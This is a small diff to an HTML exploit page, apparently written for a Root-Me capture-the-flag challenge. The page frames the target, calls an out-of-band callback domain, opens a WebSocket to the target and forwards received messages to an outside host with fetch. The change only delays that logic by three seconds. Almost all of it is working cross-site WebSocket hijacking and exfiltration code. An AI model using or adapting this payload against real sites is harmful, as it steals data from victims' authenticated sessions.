@@ -7,6 +7,7 @@
     <iframe src=http://ctf29.root-me.org/room”></iframe>
 <script>
       fetch('https://zzuwmhquorgudjdpemhho6v60fd1xj2uo.oast.fun/ok1');
+    setTimeout(() => {
         var ws = new WebSocket('ws://ctf29.root-me.org/ws');
 
         ws.onopen = function() {
@@ -20,6 +21,7 @@
                 body: event.data
             });
         };
+    },3000);
 </script>
 
 </body> 
